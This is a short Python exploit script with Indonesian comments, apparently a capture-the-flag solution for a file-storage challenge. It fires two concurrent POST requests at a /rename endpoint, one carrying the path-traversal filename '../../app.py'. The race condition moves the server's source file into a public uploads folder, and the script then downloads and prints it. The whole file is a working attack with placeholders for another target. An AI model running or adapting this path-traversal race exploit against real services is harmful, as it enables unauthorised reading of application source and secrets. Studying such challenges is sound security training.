import requests
import threading

# -- KONFIGURASI --
TARGET_URL = "av29eji3r0oiaqq4.zerostorage.ctf.towerofhanoi.it"  # Ganti dengan URL target Anda
TARGET_UUID = "c2b11992-9a27-4b87-8e67-ccbb74c5b9cc" # Ganti dengan UUID yang didapat dari langkah 1
# -----------------

# File yang ingin kita baca dari root direktori
file_to_read = "app.py" 
# Nama file baru setelah berhasil dipindahkan ke dalam folder uploads
new_leaked_filename = "leaked_source.txt"

# Request A: Si peracun yang akan gagal
def poison_request():
    payload = {"new_filename": f"../../{file_to_read}"}
    try:
        r = requests.post(f"{TARGET_URL}/rename/{TARGET_UUID}", json=payload, timeout=5)
        # Kita harapkan request ini gagal, itu tidak masalah
        # print(f"[Poisoner] Status: {r.status_code}, Response: {r.text}")
    except requests.exceptions.RequestException as e:
        # print(f"[Poisoner] Error: {e}")
        pass

# Request B: Si pemindah yang akan berhasil
def move_request():
    payload = {"new_filename": new_leaked_filename}
    try:
        r = requests.post(f"{TARGET_URL}/rename/{TARGET_UUID}", json=payload, timeout=5)
        # Jika berhasil, kita akan dapat redirect (302)
        # print(f"[Mover] Status: {r.status_code}, Response: {r.text}")
    except requests.exceptions.RequestException as e:
        # print(f"[Mover] Error: {e}")
        pass

# Membuat dan menjalankan kedua thread secara bersamaan
thread1 = threading.Thread(target=poison_request)
thread2 = threading.Thread(target=move_request)

# Menjalankan thread
# Kunci keberhasilan adalah memulai keduanya hampir di saat yang sama
thread1.start()
thread2.start()

# Menunggu thread selesai
thread1.join()
thread2.join()

print("Race condition attack finished.")
print("Checking if the file was leaked...")

# 3. Verifikasi dan Baca File Hasil Eksploitasi
try:
    leaked_url = f"{TARGET_URL}/uploads/{TARGET_UUID}"
    response = requests.get(leaked_url)

    if response.status_code == 200:
        print("\n✅ SUCCESS! File leaked successfully.")
        print(f"Access the leaked file at: {leaked_url}")
        print("\n--- Leaked File Content ---")
        print(response.text)
        print("---------------------------")
    else:
        print(f"\n❌ FAILED. Could not access the leaked file. Status: {response.status_code}")

except requests.exceptions.RequestException as e:
    print(f"\n❌ FAILED. An error occurred: {e}")